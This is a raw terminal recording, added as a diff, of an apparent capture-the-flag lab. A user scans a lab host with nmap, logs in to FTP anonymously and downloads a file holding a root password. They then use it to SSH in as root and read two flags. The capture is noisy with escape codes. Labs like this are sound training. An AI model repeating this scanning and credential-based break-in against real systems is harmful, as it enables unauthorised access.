@@ -1,0 +1,118 @@
+Script started on 2025-07-04 22:18:32+05:30 [TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="115" LINES="61"]
+                                                                                                                   ]0;alfonz@kali: ~[0m[27m[24m[J[32m┌──([1m[32m[34malfonz㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004h[A[0m[27m[24m[J[32m┌──([1m[32m[34malfonz㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m n[4mn[24m[4mn[24m[38;2;153;153;153meofetch[39m[4mn[39m[4mm[24m[39m [39m [39m [39m [39m [39m [24m[36mn[24m[36mm[39m[38;2;153;153;153map 10.1[39m[38;2;153;153;153m0.210.177[39m[16D[36mn[36mm[36ma[39m[5C[38;2;153;153;153m1[38;2;153;153;153m0[39m[39m[4mn[39m[4mm[39m[4ma[24m[4mn[4mm[24m[24m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [16D[24m[36mn[24m[36mm[39m[38;2;153;153;153map 10.1[39m[38;2;153;153;153m0.210.17[39m[38;2;153;153;153m7[39m[16D[36mn[39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [17D[39m[4mn[24m[4mn[24m[38;2;153;153;153meofetch[39m[24m [39m [39m [39m [39m [39m [39m [39m [8Ds[4ms[24m[4ms[24m[38;2;153;153;153msh2john[39m[38;2;153;153;153m id_rsa [39m[38;2;153;153;153m>[39m[38;2;153;153;153m rsahash.txt[39m[28D[4ms[39m[4mu[24m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [27D[24m[36ms[24m[36mu[39m[38;2;153;153;153mdo apt [39m[38;2;153;153;153mupgrade [39m[38;2;153;153;153m-[39m[38;2;153;153;153my[39m[17D[36ms[36mu[36md[39m[5C[38;2;153;153;153m [38;2;153;153;153mu[39m[6C[38;2;153;153;153m [14D[39m[39m[4ms[39m[4mu[39m[4md[24m[4md[39m[4mo[24m[5C[38;2;153;153;153mu[38;2;153;153;153mp[39m[6C[38;2;153;153;153m-[14D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m[4m[32mo[4m[32m [24m[39m[5C[38;2;153;153;153mp[4m[32mo[24m[39m[24m[39m [39mn[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [13D[4mn[24m[38;2;153;153;153mmap --script "[39m[38;2;153;153;153mssh2-enum-algos" 10.10.252.134[39m[44D[4mn[39m[4mm[24m[12C[38;2;153;153;153m"[38;2;153;153;153ms[39m[14D[24m[36mn[24m[36mm[39m[39mn[39mm[13C[38;2;153;153;153ms[14D[39m
+Completing external command
+[0mnm                    nm-applet             nmblookup             nm-connection-editor  nmtui                 nmtui-edit                                                                                            
+[Jnmap                  [Jnmbd                  [Jnmcli                 [Jnm-online             [Jnmtui-connect         [Jnmtui-hostname        [J                                                                                [3A[0m[27m[24m[0m[39m[4C[4m[32msudo[24m[39m nm[38;2;153;153;153map --script "ssh2-enum-algos" 10.10.252.134[39m[K[0m[39m[43D[36mn[36mm[39m[36mm[36ma[39m[39m[4mn[39m[4mm[39m[4ma[24m[4ma[39m[4mp[24m[24m[36mn[24m[36mm[24m[36ma[24m[36mp[39m[36mp[36m [39m[36mp[39m[39m [39m1[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39D[38;2;153;153;153m0.10.208.122[39m[12D[39m0[39m.[39m1[39m0[39m.[39m2[39m3[39m [39m [39m [39m [39m 6.55[?1l>[?2004l
+[J[sudo] password for alfonz: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-04 22:18 IST
+Nmap scan report for 10.10.236.55
+Host is up (0.19s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 2.65 seconds
+                                                                                                                                                                                                                                            ]0;alfonz@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34malfonz㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hf[4mf[24m[4mf[4mt[24m[4mf[4mt[4mp[24m[24m[36mf[24m[36mt[24m[36mp[39m[36mp[36m [39m[36mp[39m[39m 10.10.236.55[?1l>[?2004l
+Connected to 10.10.236.55.
+220 (vsFTPd 3.0.5)
+Name (10.10.236.55:alfonz): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||48535|)
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp        425351 Apr 06  2022 2680-0.txt
+-rw-r--r--    1 ftp      ftp           356 Apr 06  2022 2680.epub
+-rw-r--r--    1 ftp      ftp        251857 Apr 06  2022 55317-0.txt
+-rw-r--r--    1 ftp      ftp           358 Apr 06  2022 55317.epub
+-rwxr-xr-x    1 ftp      ftp           214 Apr 06  2022 backup.sh
+-rw-r--r--    1 ftp      ftp            23 Apr 06  2022 secret.txt
+226 Directory send OK.
+ftp> get sec[13Gret.txt
+local: secret.txt remote: secret.txt
+229 Entering Extended Passive Mode (|||49783|)
+150 Opening BINARY mode data connection for secret.txt (23 bytes).
+  0% |                                                                                                                                                                                               |     0        0.00 KiB/s    --:-- ETA100% |***********************************************************************************************************************************************************************************************|    23      863.88 KiB/s    00:00 ETA
+226 Transfer complete.
+23 bytes received in 00:00 (0.07 KiB/s)
+ftp> exit
+221 Goodbye.
+                                                                                                                                                                                                                                            ]0;alfonz@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34malfonz㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hc[4mc[24m[4mc[24m[38;2;153;153;153md Task11[39m[8D[4mc[39m[4ma[24m[39m [39m [39m [39m [39m [39m [39m [38;2;153;153;153mt flag.t[39m[38;2;153;153;153mxt[39m[10D[4mc[4ma[39m[4mt[24m[6C[38;2;153;153;153mt[38;2;153;153;153mx[39m[8D[24m[36mc[24m[36ma[24m[36mt[39m[36mt[36m [39m[6C[38;2;153;153;153mx[36mt[39m[39m [39ms[39m [39m [39m [39m [39m [39m [39m [1ms[0m[38;2;153;153;153mcan_172_[39m[38;2;153;153;153m17_network.nmap[39m[23D[0ms[7C[38;2;153;153;153m_[8D[39m
+Completing file
+[J[0mscan_172_17_network.gnmap  [Jscan_172_17_network.nmap   [Jsecret.txt               [J[A[A[0m[27m[24m[0m[39m[4C[36mcat[39m s[38;2;153;153;153mcan_172_17_network.nmap[39m[K[0m[39m[23D[1ms[0m[1ms[39m[1me[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [22D[1me[1mc[0m[1mc[1mret.txt[0m[1m [0m[0m [?1l>[?2004l
+[Jpassword: ABC789xyz123
+                                                                                                                                                                                                                                            ]0;alfonz@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34malfonz㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hs[4ms[24m[4ms[24m[38;2;153;153;153mudo nmap 10.10.236.55[39m[21D[4ms[39m[4ms[24m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [20D[24m[36ms[24m[36ms[39m[38;2;153;153;153mh2john id_rsa > rsaha[39m[38;2;153;153;153msh.txt[39m[27D[36ms[36ms[36mh[39m[19C[38;2;153;153;153ma[38;2;153;153;153ms[39m[21D[36mh[36m [39m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [25D[36mh[39m[39m root@10.10.236.55[?1l>[?2004l
+The authenticity of host '10.10.236.55 (10.10.236.55)' can't be established.
+ED25519 key fingerprint is SHA256:sGi85sTK/UesHWWOXPy/KoFT6f1fO2lLaY6pXFnVqDg.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.236.55' (ED25519) to the list of known hosts.
+root@10.10.236.55's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri  4 Jul 16:50:31 UTC 2025
+
+  System load:  0.07              Processes:             118
+  Usage of /:   62.8% of 6.50GB   Users logged in:       0
+  Memory usage: 14%               IPv4 address for ens5: 10.10.236.55
+  Swap usage:   0%
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+Expanded Security Maintenance for Applications is not enabled.
+
+21 updates can be applied immediately.
+12 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+Last login: Sat May 24 14:46:25 2025 from 10.23.8.228
+]0;root@ip-10-10-236-55: ~root@ip-10-10-236-55:~# pwd
+/root
+]0;root@ip-10-10-236-55: ~root@ip-10-10-236-55:~# ls
+flag.txt  [0m[01;34msnap[0m
+]0;root@ip-10-10-236-55: ~root@ip-10-10-236-55:~# cat flag.txt 
+THM{FTP_SERVER_OWNED}
+]0;root@ip-10-10-236-55: ~root@ip-10-10-236-55:~# cd /home
+]0;root@ip-10-10-236-55: /homeroot@ip-10-10-236-55:/home# ls
+[0m[01;34mftpsecure[0m  [01;34mlibrarian[0m  [01;34mstrategos[0m  [01;34mubuntu[0m
+]0;root@ip-10-10-236-55: /homeroot@ip-10-10-236-55:/home# cd librarian/
+]0;root@ip-10-10-236-55: /home/librarianroot@ip-10-10-236-55:/home/librarian# pwd
+/home/librarian
+]0;root@ip-10-10-236-55: /home/librarianroot@ip-10-10-236-55:/home/librarian# ls
+flag.txt
+]0;root@ip-10-10-236-55: /home/librarianroot@ip-10-10-236-55:/home/librarian# cat flag.txt 
+THM{LIBRARIAN_ACCOUNT_COMPROMISED}
+]0;root@ip-10-10-236-55: /home/librarianroot@ip-10-10-236-55:/home/librarian# exit
+logout
+Connection to 10.10.236.55 closed.
+                                                                                                                                                                                                                                            ]0;alfonz@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34malfonz㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004he[4me[24m[4me[24m[38;2;153;153;153mxit[39m[4me[39m[4mx[24m[24m[36me[24m[36mx[39m[36me[36mx[36mi[39m[39m[4me[39m[4mx[39m[4mi[24m[4mi[39m[4mt[24m[24m[36me[24m[36mx[24m[36mi[24m[36mt[39m[?1l>[?2004l
+
+Script done on 2025-07-04 22:21:53+05:30 [COMMAND_EXIT_CODE="0"]
